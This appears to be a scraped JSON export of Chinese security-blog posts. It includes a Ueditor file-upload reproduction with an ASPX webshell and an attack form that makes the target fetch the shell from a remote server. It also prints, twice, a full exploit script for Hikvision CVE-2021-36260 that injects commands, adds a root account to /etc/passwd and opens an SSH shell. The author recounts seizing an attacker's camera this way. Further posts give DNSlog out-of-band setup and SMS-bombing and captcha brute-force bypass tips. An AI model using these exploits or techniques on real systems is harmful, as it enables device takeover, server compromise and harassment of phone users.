这样不是长久之计，但目前能做的只有抓不到就删除一次，抓不到删除一次，问我为什么这样就可以了，我也不懂hhh。有师傅有更好的解决方案，欢迎评论区提出~","categories":[{"name":"安全工具/安全开发","slug":"安全工具-安全开发","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"BurpSuite","slug":"BurpSuite","permalink":"https://wolke.cn/tags/BurpSuite/"},{"name":"微信小程序","slug":"微信小程序","permalink":"https://wolke.cn/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"author":"w01ke"},{"title":"Ueditor编辑器任意文件上传漏洞","slug":"Ueditor编辑器任意文件上传漏洞","date":"2022-07-30T11:58:18.000Z","updated":"2022-07-30T12:50:26.545Z","comments":true,"path":"post/bd0a7a34.html","link":"","permalink":"https://wolke.cn/post/bd0a7a34.html","excerpt":"","text":"一、漏洞描述UEditor是一款所见即所得的开源富文本编辑器，具有轻量、可定制、用户体验优秀等特点，被广大WEB应用程序所使用。本次爆出的高危漏洞属于.NET版本，其它的版本暂时不受影响。漏洞成因是在抓取远程数据源的时候未对文件后缀名做验证导致任意文件写入漏洞，黑客利用此漏洞可以在服务器上执行任意指令，综合评级高危。 二、影响范围该漏洞影响UEditor的.Net版本，其它语言版本暂时未受影响。 三、漏洞原理漏洞的成因是在获取图片资源时仅检查了Content-Type，导致可以绕过达到任意文件上传。具体的漏洞分析可参考：https://www.freebuf.com/vuls/181814.html 四、漏洞复现1、环境部署准备一台Windows Server服务器，我用的是Windows 2008 Server。 没有安装.NET Framework 4.0的要先安装：http://www.microsoft.com/zh-cn/download/details.aspx?id=17718 安装完 .NET Framework 4.0 后，还需要向 IIS 注册应用程序池，注册的方法是，使用管理员权限打开命令提示符（CMD），输入以下命令： C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_regiis -i 安装完毕后，在 IIS 管理器刷新就能看到 4.0 的应用程序池。 https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3 下载utf8的.net版本 右键 网站–添加网站，选择下载的Ueditor目录， 选择版本为 4.0 的应用程序池；点击连接为，设置特定用户，该特定用户为主机上存在的用户例如administrator 此时访问127.0.0.1:8080已经有Ueditor的界面了 代码要求以应用程序的形式来运行（可以方便加入库依赖和组织代码）。所以需要把 net 目录转换为应用程序；点击连接为，设置特定用户，该特定用户为主机上存在的用户例如administrator 访问net/controller.ashx 控制器文件，出现以下界面说明编辑器应用程序运行成功，且漏洞存在，到此配置完毕。 如果配置过程中访问页面显示权限不够的报错，那么右键部署项目的文件夹，选择属性，选择安全，增加Everyone用户，将该用户的权限设置为完全控制，点击确定，重新部署即可。 2、攻击流程访问http://ip:port/net/controller.ashx 控制器文件。当出现下图的时候表示漏洞存在 准备一个aspx一句话木马 &lt;% @Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;w01ke&quot;],&quot;unsafe&quot;);%&gt; 制作图片马 copy w01ke.jpg /b + shell.aspx /a ueditor.jpg 准备一台服务器存放图片马或者需要上传的文件，将做好的ueditor.jpg图片马上传到我们的服务器，并开启下载服务（HTTP） python -m SimpleHTTPServer 8080 制作一个HTML。因为不是上传漏洞所以enctype 不需要指定为multipart/form-data。 &lt;form action=&quot;http://xxxxx/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot;&gt; &lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt; 其中http://xx.com 为需要测试的网站地址，action后填写路径为实际中遇到的路径，不要太死板，如果太死板不按网站的实际路径来就会出现路径找不到的错误 打开我们做好的HTML，shell addr 处填写服务器上图片马地址，构造成以下格式，绕过上传使其解析为 aspx http://xxxx/ueditor.jpg?.aspx 点击submit，直接显示无效URL 经过排查，发现不能用Python开启web的方式，貌似只能用域名的形式（我不确定），我只好把我的图片马上传至云服务器，然后修改访问域名即可成功，同时回显了木马路径 使用蚁剑连接： 五、防御措施 修改CrawlerHandler.cs 增加对文件扩展名的； IPS等防御产品可以加入相应的特征","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Ueditor","slug":"Ueditor","permalink":"https://wolke.cn/tags/Ueditor/"},{"name":".NET","slug":"NET","permalink":"https://wolke.cn/tags/NET/"}],"author":"w01ke"},{"title":"海康威视远程命令执行漏洞（CVE-2021-36260）","slug":"海康威视远程命令执行漏洞（CVE-2021-36260）","date":"2022-07-29T07:54:06.000Z","updated":"2022-07-29T11:37:31.042Z","comments":true,"path":"post/8d6522ff.html","link":"","permalink":"https://wolke.cn/post/8d6522ff.html","excerpt":"","text":"一、前言作为HW2022的防守方，发现一IP频繁对我方资产进行扫描，遂进行溯源 二、漏洞概述攻击者利用该漏洞可以用无限制的 root shell 来完全控制设备，即使设备的所有者受限于有限的受保护 shell（psh）。除了入侵 IP 摄像头外，还可以访问和攻击内部网络。 该漏洞的利用并不需要用户交互，攻击者只需要访问 http 或 HTTPS 服务器端口（80/443）即可利用该漏洞，无需用户名、密码、以及其他操作。摄像头本身也不会检测到任何登录信息。 三、溯源过程定位攻击IP与搜索威胁情报，发现是恶意IP Fofa空间搜索引擎发现该IP开放了82端口 访问发现是HIKVISION的登录界面 漏洞点位于：/SDK/webLanguage，利用PUT方法上传xml数据： &lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&lt;language&gt;$(Command &gt; webLib/x)&lt;/language&gt; 再去请求路径：/x，发现命令已经执行成功 使用EXP成功拿下该摄像头的完全控制权，排查后此应为攻击者的跳板机 此网段存在许多感染摄像头，也都存在上述漏洞 虽然拿下了完全控制权，但是不知道如何查看摄像头Web页面的管理员账号密码，有大佬知道的可以评论区教教我（万分感谢！） 四、POC# Exploit Title: Hikvision Web Server Build 210702 - Command Injection# Exploit Author: bashis# Vendor Homepage: https://www.hikvision.com/# Version: 1.0# CVE: CVE-2021-36260# Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html# All credit to Watchful_IP#!/usr/bin/env python3&quot;&quot;&quot;Note:1) This code will _not_ verify if remote is Hikvision device or not.2) Most of my interest in this code has been concentrated on how to reliably detect vulnerable and/or exploitable devices. Some devices are easy to detect, verify and exploit the vulnerability, other devices may be vulnerable but not so easy to verify and exploit. I think the combined verification code should have very high accuracy.3) &#x27;safe check&#x27; (--check) will try write and read for verification &#x27;unsafe check&#x27; (--reboot) will try reboot the device for verification[Examples]Safe vulnerability/verify check: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --checkSafe and unsafe vulnerability/verify check:(will only use &#x27;unsafe check&#x27; if not verified with &#x27;safe check&#x27;) $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --rebootUnsafe vulnerability/verify check: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --rebootLaunch and connect to SSH shell: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shellExecute command: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd &quot;ls -l&quot;Execute blind command: $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind &quot;reboot&quot;$./CVE-2021-36260.py -h[*] Hikvision CVE-2021-36260[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check] [--reboot] [--shell] [--cmd CMD] [--cmd_blind CMD_BLIND] [--noverify] [--proto &#123;http,https&#125;]optional arguments: -h, --help show this help message and exit --rhost RHOST Remote Target Address (IP/FQDN) --rport RPORT Remote Target Port --check Check if vulnerable --reboot Reboot if vulnerable --shell Launch SSH shell --cmd CMD execute cmd (i.e: &quot;ls -l&quot;) --cmd_blind CMD_BLIND execute blind cmd (i.e: &quot;reboot&quot;) --noverify Do not verify if vulnerable --proto &#123;http,https&#125; Protocol used$&quot;&quot;&quot;import osimport argparseimport timeimport requestsfrom requests import packagesfrom requests.packages import urllib3from requests.packages.urllib3 import exceptionsclass Http(object): def __init__(self, rhost, rport, proto, timeout=60): super(Http, self).__init__() self.rhost = rhost self.rport = rport self.proto = proto self.timeout = timeout self.remote = None self.uri = None &quot;&quot;&quot; Most devices will use self-signed certificates, suppress any warnings &quot;&quot;&quot; requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) self.remote = requests.Session() self._init_uri() self.remote.headers.update(&#123; &#x27;Host&#x27;: f&#x27;&#123;self.rhost&#125;:&#123;self.rport&#125;&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;, &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.9,sv;q=0.8&#x27;, &#125;) &quot;&quot;&quot; self.remote.proxies.update(&#123; # &#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;, &#125;) &quot;&quot;&quot; def send(self, url=None, query_args=None, timeout=5): if query_args: &quot;&quot;&quot;Some devices can handle more, others less, 22 bytes seems like a good compromise&quot;&quot;&quot; if len(query_args) &gt; 22: print(f&#x27;[!] Error: Command &quot;&#123;query_args&#125;&quot; to long (&#123;len(query_args)&#125;)&#x27;) return None &quot;&quot;&quot;This weird code will try automatically switch between http/https and update Host &quot;&quot;&quot; try: if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) except requests.exceptions.ConnectionError: self.proto = &#x27;https&#x27; if self.proto == &#x27;http&#x27; else &#x27;https&#x27; self._init_uri() try: if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) except requests.exceptions.ConnectionError: return None except requests.exceptions.RequestException: return None except KeyboardInterrupt: return None &quot;&quot;&quot;302 when requesting http on https enabled device&quot;&quot;&quot; if data.status_code == 302: redirect = data.headers.get(&#x27;Location&#x27;) self.uri = redirect[:redirect.rfind(&#x27;/&#x27;)] self._update_host() if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) return data def _update_host(self): if not self.remote.headers.get(&#x27;Host&#x27;) == self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:]: self.remote.headers.update(&#123; &#x27;Host&#x27;: self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:], &#125;) def _init_uri(self): self.uri = &#x27;&#123;proto&#125;://&#123;rhost&#125;:&#123;rport&#125;&#x27;.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport)) def put(self, url, query_args, timeout): &quot;&quot;&quot;Command injection in the &lt;language&gt; tag&quot;&quot;&quot; query_args = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27; \\ f&#x27;&lt;language&gt;$(&#123;query_args&#125;)&lt;/language&gt;&#x27; return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout) def get(self, url, timeout): return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)def check(remote, args): &quot;&quot;&quot; status_code == 200 (OK); Verified vulnerable and exploitable status_code == 500 (Internal Server Error); Device may be vulnerable, but most likely not The SDK webLanguage tag is there, but generate status_code 500 when language not found I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500) (Issue: Could also be other directory than &#x27;webLib&#x27;, r/o FS etc...) status_code == 401 (Unauthorized); Defiantly not vulnerable &quot;&quot;&quot; if args.noverify: print(f&#x27;[*] Not verifying remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) return True print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) data = remote.send(url=&#x27;/&#x27;, query_args=None) if data is None: print(f&#x27;[-] Cannot establish connection to &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) return None print(&#x27;[i] ETag:&#x27;, data.headers.get(&#x27;ETag&#x27;)) data = remote.send(query_args=&#x27;&gt;webLib/c&#x27;) if data is None or data.status_code == 404: print(f&#x27;[-] &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; do not looks like Hikvision&#x27;) return False status_code = data.status_code data = remote.send(url=&#x27;/c&#x27;, query_args=None) if not data.status_code == 200: &quot;&quot;&quot;We could not verify command injection&quot;&quot;&quot; if status_code == 500: print(f&#x27;[-] Could not verify if vulnerable (Code: &#123;status_code&#125;)&#x27;) if args.reboot: return check_reboot(remote, args) else: print(f&#x27;[+] Remote is not vulnerable (Code: &#123;status_code&#125;)&#x27;) return False print(&#x27;[!] Remote is verified exploitable&#x27;) return Truedef check_reboot(remote, args): &quot;&quot;&quot; We sending &#x27;reboot&#x27;, wait 2 sec, then checking with GET request. - if there is data returned, we can assume remote is not vulnerable. - If there is no connection or data returned, we can assume remote is vulnerable. &quot;&quot;&quot; if args.check: print(&#x27;[i] Checking if vulnerable with &quot;reboot&quot;&#x27;) else: print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; with &quot;reboot&quot;&#x27;) remote.send(query_args=&#x27;reboot&#x27;) time.sleep(2) if not remote.send(url=&#x27;/&#x27;, query_args=None): print(&#x27;[!] Remote is vulnerable&#x27;) return True else: print(&#x27;[+] Remote is not vulnerable&#x27;) return Falsedef cmd(remote, args): if not check(remote, args): return False data = remote.send(query_args=f&#x27;&#123;args.cmd&#125;&gt;webLib/x&#x27;) if data is None: return False data = remote.send(url=&#x27;/x&#x27;, query_args=None) if data is None or not data.status_code == 200: print(f&#x27;[!] Error execute cmd &quot;&#123;args.cmd&#125;&quot;&#x27;) return False print(data.text) return Truedef cmd_blind(remote, args): &quot;&quot;&quot; Blind command injection &quot;&quot;&quot; if not check(remote, args): return False data = remote.send(query_args=f&#x27;&#123;args.cmd_blind&#125;&#x27;) if data is None or not data.status_code == 500: print(f&#x27;[-] Error execute cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;) return False print(f&#x27;[i] Try execute blind cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;) return Truedef shell(remote, args): if not check(remote, args): return False data = remote.send(url=&#x27;/N&#x27;, query_args=None) if data.status_code == 404: print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; not pwned, pwning now!&#x27;) data = remote.send(query_args=&#x27;echo -n P::0:0:W&gt;N&#x27;) if data.status_code == 401: print(data.headers) print(data.text) return False remote.send(query_args=&#x27;echo :/:/bin/sh&gt;&gt;N&#x27;) remote.send(query_args=&#x27;cat N&gt;&gt;/etc/passwd&#x27;) remote.send(query_args=&#x27;dropbear -R -B -p 1337&#x27;) remote.send(query_args=&#x27;cat N&gt;webLib/N&#x27;) else: print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; already pwned&#x27;) print(f&#x27;[*] Trying SSH to &#123;args.rhost&#125; on port 1337&#x27;) os.system(f&#x27;stty echo; stty iexten; stty icanon; \\ ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \\ P@&#123;args.rhost&#125; -p 1337&#x27;)def main(): print(&#x27;[*] Hikvision CVE-2021-36260\\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#x27;) parser = argparse.ArgumentParser() parser.add_argument(&#x27;--rhost&#x27;, required=True, type=str, default=None, help=&#x27;Remote Target Address (IP/FQDN)&#x27;) parser.add_argument(&#x27;--rport&#x27;, required=False, type=int, default=80, help=&#x27;Remote Target Port&#x27;) parser.add_argument(&#x27;--check&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Check if vulnerable&#x27;) parser.add_argument(&#x27;--reboot&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Reboot if vulnerable&#x27;) parser.add_argument(&#x27;--shell&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Launch SSH shell&#x27;) parser.add_argument(&#x27;--cmd&#x27;, required=False, type=str, default=None, help=&#x27;execute cmd (i.e: &quot;ls -l&quot;)&#x27;) parser.add_argument(&#x27;--cmd_blind&#x27;, required=False, type=str, default=None, help=&#x27;execute blind cmd (i.e: &quot;reboot&quot;)&#x27;) parser.add_argument( &#x27;--noverify&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Do not verify if vulnerable&#x27; ) parser.add_argument( &#x27;--proto&#x27;, required=False, type=str, choices=[&#x27;http&#x27;, &#x27;https&#x27;], default=&#x27;http&#x27;, help=&#x27;Protocol used&#x27; ) args = parser.parse_args() remote = Http(args.rhost, args.rport, args.proto) try: if args.shell: shell(remote, args) elif args.cmd: cmd(remote, args) elif args.cmd_blind: cmd_blind(remote, args) elif args.check: check(remote, args) elif args.reboot: check_reboot(remote, args) else: parser.parse_args([&#x27;-h&#x27;]) except KeyboardInterrupt: return Falseif __name__ == &#x27;__main__&#x27;: main() import osimport argparseimport timeimport requestsfrom requests import packagesfrom requests.packages import urllib3from requests.packages.urllib3 import exceptionsclass Http(object): def __init__(self, rhost, rport, proto, timeout=60): super(Http, self).__init__() self.rhost = rhost self.rport = rport self.proto = proto self.timeout = timeout self.remote = None self.uri = None requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) self.remote = requests.Session() self._init_uri() self.remote.headers.update(&#123; &#x27;Host&#x27;: f&#x27;&#123;self.rhost&#125;:&#123;self.rport&#125;&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;, &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.9,sv;q=0.8&#x27;, &#125;) def send(self, url=None, query_args=None, timeout=5): if query_args: if len(query_args) &gt; 22: print(f&#x27;[!] Error: Command &quot;&#123;query_args&#125;&quot; to long (&#123;len(query_args)&#125;)&#x27;) return None try: if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) except requests.exceptions.ConnectionError: self.proto = &#x27;https&#x27; if self.proto == &#x27;http&#x27; else &#x27;https&#x27; self._init_uri() try: if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) except requests.exceptions.ConnectionError: return None except requests.exceptions.RequestException: return None except KeyboardInterrupt: return None if data.status_code == 302: redirect = data.headers.get(&#x27;Location&#x27;) self.uri = redirect[:redirect.rfind(&#x27;/&#x27;)] self._update_host() if url and not query_args: return self.get(url, timeout) else: data = self.put(&#x27;/SDK/webLanguage&#x27;, query_args, timeout) return data def _update_host(self): if not self.remote.headers.get(&#x27;Host&#x27;) == self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:]: self.remote.headers.update(&#123; &#x27;Host&#x27;: self.uri[self.uri.rfind(&#x27;://&#x27;) + 3:], &#125;) def _init_uri(self): self.uri = &#x27;&#123;proto&#125;://&#123;rhost&#125;:&#123;rport&#125;&#x27;.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport)) def put(self, url, query_args, timeout): query_args = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27; \\ f&#x27;&lt;language&gt;$(&#123;query_args&#125;)&lt;/language&gt;&#x27; return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout) def get(self, url, timeout): return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)def check(remote, args): if args.noverify: print(f&#x27;[*] Not verifying remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) return True print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) data = remote.send(url=&#x27;/&#x27;, query_args=None) if data is None: print(f&#x27;[-] Cannot establish connection to &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot;&#x27;) return None print(&#x27;[i] ETag:&#x27;, data.headers.get(&#x27;ETag&#x27;)) data = remote.send(query_args=&#x27;&gt;webLib/c&#x27;) if data is None or data.status_code == 404: print(f&#x27;[-] &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; do not looks like Hikvision&#x27;) return False status_code = data.status_code data = remote.send(url=&#x27;/c&#x27;, query_args=None) if not data.status_code == 200: if status_code == 500: print(f&#x27;[-] Could not verify if vulnerable (Code: &#123;status_code&#125;)&#x27;) if args.reboot: return check_reboot(remote, args) else: print(f&#x27;[+] Remote is not vulnerable (Code: &#123;status_code&#125;)&#x27;) return False print(&#x27;[!] Remote is verified exploitable&#x27;) return Truedef check_reboot(remote, args): if args.check: print(&#x27;[i] Checking if vulnerable with &quot;reboot&quot;&#x27;) else: print(f&#x27;[*] Checking remote &quot;&#123;args.rhost&#125;:&#123;args.rport&#125;&quot; with &quot;reboot&quot;&#x27;) remote.send(query_args=&#x27;reboot&#x27;) time.sleep(2) if not remote.send(url=&#x27;/&#x27;, query_args=None): print(&#x27;[!] Remote is vulnerable&#x27;) return True else: print(&#x27;[+] Remote is not vulnerable&#x27;) return Falsedef cmd(remote, args): if not check(remote, args): return False data = remote.send(query_args=f&#x27;&#123;args.cmd&#125;&gt;webLib/x&#x27;) if data is None: return False data = remote.send(url=&#x27;/x&#x27;, query_args=None) if data is None or not data.status_code == 200: print(f&#x27;[!] Error execute cmd &quot;&#123;args.cmd&#125;&quot;&#x27;) return False print(data.text) return Truedef cmd_blind(remote, args): if not check(remote, args): return False data = remote.send(query_args=f&#x27;&#123;args.cmd_blind&#125;&#x27;) if data is None or not data.status_code == 500: print(f&#x27;[-] Error execute cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;) return False print(f&#x27;[i] Try execute blind cmd &quot;&#123;args.cmd_blind&#125;&quot;&#x27;) return Truedef shell(remote, args): if not check(remote, args): return False data = remote.send(url=&#x27;/N&#x27;, query_args=None) if data.status_code == 404: print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; not pwned, pwning now!&#x27;) data = remote.send(query_args=&#x27;echo -n P::0:0:W&gt;N&#x27;) if data.status_code == 401: print(data.headers) print(data.text) return False remote.send(query_args=&#x27;echo :/:/bin/sh&gt;&gt;N&#x27;) remote.send(query_args=&#x27;cat N&gt;&gt;/etc/passwd&#x27;) remote.send(query_args=&#x27;dropbear -R -B -p 1337&#x27;) remote.send(query_args=&#x27;cat N&gt;webLib/N&#x27;) else: print(f&#x27;[i] Remote &quot;&#123;args.rhost&#125;&quot; already pwned&#x27;) print(f&#x27;[*] Trying SSH to &#123;args.rhost&#125; on port 1337&#x27;) os.system(f&#x27;ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \\ P@&#123;args.rhost&#125; -p 1337&#x27;)def main(): print(&#x27;[*] Hikvision CVE-2021-36260\\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#x27;) parser = argparse.ArgumentParser() parser.add_argument(&#x27;--rhost&#x27;, required=True, type=str, default=None, help=&#x27;Remote Target Address (IP/FQDN)&#x27;) parser.add_argument(&#x27;--rport&#x27;, required=False, type=int, default=80, help=&#x27;Remote Target Port&#x27;) parser.add_argument(&#x27;--check&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Check if vulnerable&#x27;) parser.add_argument(&#x27;--reboot&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Reboot if vulnerable&#x27;) parser.add_argument(&#x27;--shell&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Launch SSH shell&#x27;) parser.add_argument(&#x27;--cmd&#x27;, required=False, type=str, default=None, help=&#x27;execute cmd (i.e: &quot;ls -l&quot;)&#x27;) parser.add_argument(&#x27;--cmd_blind&#x27;, required=False, type=str, default=None, help=&#x27;execute blind cmd (i.e: &quot;reboot&quot;)&#x27;) parser.add_argument( &#x27;--noverify&#x27;, required=False, default=False, action=&#x27;store_true&#x27;, help=&#x27;Do not verify if vulnerable&#x27; ) parser.add_argument( &#x27;--proto&#x27;, required=False, type=str, choices=[&#x27;http&#x27;, &#x27;https&#x27;], default=&#x27;http&#x27;, help=&#x27;Protocol used&#x27; ) args = parser.parse_args() remote = Http(args.rhost, args.rport, args.proto) try: if args.shell: shell(remote, args) elif args.cmd: cmd(remote, args) elif args.cmd_blind: cmd_blind(remote, args) elif args.check: check(remote, args) elif args.reboot: check_reboot(remote, args) else: parser.parse_args([&#x27;-h&#x27;]) except KeyboardInterrupt: return Falseif __name__ == &#x27;__main__&#x27;: main()","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Hikvison","slug":"Hikvison","permalink":"https://wolke.cn/tags/Hikvison/"}],"author":"w01ke"},{"title":"DNSlog平台的搭建","slug":"DNSlog平台的搭建","date":"2022-07-11T19:33:21.000Z","updated":"2022-07-11T19:53:40.207Z","comments":true,"path":"post/54d8f8e4.html","link":"","permalink":"https://wolke.cn/post/54d8f8e4.html","excerpt":"","text":"一、DNSlog简介在某些情况下，无法利用漏洞获得回显。但是，如果目标可以发送DNS请求，则可以通过DNS log方式将想获得的数据外带出来（oob）。 DNS log常用于以下情况： SQL盲注 无回显的命令执行 无回显的SSRF 二、搭建DNS log平台1、前期准备一台VPS 1.x.x.x 一个域名 wolke.cn 在wolke.cn中添加添加一个A记录与一个NS记录。其中A记录指向服务器IP地址，NS记录指向A记录的域名地址 2、项目部署参考开源项目DNSlog-GO：https://github.com/lanyi1998/DNSlog-GO 该项目是由GO语言编写的,所以部署的时候需要用到GO语言的环境 DNS使用的是53（UDP）端口，记得53端口的放行 配置文件config.yaml的修改（我这里HTTP采用的是8000端口，也记得要放行） 启动 3、测试访问http://ip:8000 需要输入token，这里的token就是config.yaml设置的值 点击复制随机子域名获取到 8xek8.dnslog.wolke.cn 使用ping命令 可以看到回显结果 三、后台运行并加入开机自启动上面的方法有两个不足 无法后台运行 重启后进程不复存在 经过一个多小时的排错和搜索资料，终于实现了开机自启动并后台运行。这里我详细地写下教程，免得大家像我一样出现很多错误耽误时间。 1、编写Shell脚本在/root/DNSlog目录下编写run.sh，内容如下 cd /root/DNSlog # 这里根据自己DNSlog的main可执行文件所在位置进行修改即可./main &amp; 之后执行run.sh这个脚本，此时进程虽然会输出到当前终端会话，但其实进程已经脱离了当前会话，可以安全的推出会话，进程也不会退出。 2、修改rc.localvim /etc/rc.d/rc.local 在末尾加上这句 /root/DNSlog/run.sh &gt;/dev/null 2&gt;&amp;1 给rc.local加上可执行权限 chmod +x /etc/rc.d/rc.local 3、修改rc-local服务systemctl status rc-local.service # 检查rc-local服务是否开启systemctl start rc-local.service # 开启rc-local服务systemctl enable rc-local.service # 将rc-local服务加入开机自启动 4、测试重启vps后，使用ps -ef可以发现已经自动运行了该程序，后台进程ID为1146 Web服务也能成功访问 杀死进程可以使用命令 kill -9 进程PID 5、最后到这里我们就实现了只要VPS处于开机状态，main程序就自动运行，常开随用，我们可以方便快捷地使用DNSlog。但常开随用也带来了一个问题就是，如果某个攻击者获得了我们的Token（社工或爆破等手段），那么攻击者就可能会使用我们的VPS主机开启的DNSlog服务去进行一些非法渗透，而如果被溯源到就会很麻烦，因此我们需要提高Token的复杂度且避免泄露，或者不使用这节的技术，使用原始的随开随用方法，什么时候需要用DNSlog就什么时候运行main程序，很大程度上可以避免这个问题。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"DNSlog","slug":"DNSlog","permalink":"https://wolke.cn/tags/DNSlog/"}],"author":"w01ke"},{"title":"关于验证码的那些漏洞","slug":"关于验证码的那些漏洞","date":"2022-07-11T14:34:12.000Z","updated":"2022-07-11T15:07:14.084Z","comments":true,"path":"post/48a6d673.html","link":"","permalink":"https://wolke.cn/post/48a6d673.html","excerpt":"","text":"最近看到十二师傅写了篇关于验证码漏洞的文章，觉得总结得很好，也学到了一些新思路，让我受益匪浅，原文链接： https://www.yuque.com/shier-mfbht/qh4bgb/zcee3k 一、短信轰炸这类漏洞存在的原因是没有对短信验证码的发送时间、用户及其IP作一些限制。 1、正常的短信轰炸 burp一直发包即可 2、并发绕过做了限制咋办？可以试试并发(万物皆可并发) 使用turbo intruder插件进行并发。 并发次数越大是不是轰炸就越多 3、删除Cookie绕过 可以尝试把cookie删掉，有些开发就可能根据cookie判断验证码是否获取过 4、特殊格式绕过 手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等 修改cookie，变量，返回 138888888889 12位经过短信网关取前11位，导致短信轰炸 进行能解析的编码。 二、暴力破解（任意用户登录注册）服务端未对验证时间、次数作出限制，存在爆破的可能性。简单的系统存在可以直接爆破的可能性，但做过一些防护的系统还得进行一些绕过才能进行爆破。 burpsuite对纯数字验证码爆破时间估计： 对于4位纯数字验证码：从0000~9999的10000种可能用多线程在5分钟内跑完并不是很难。 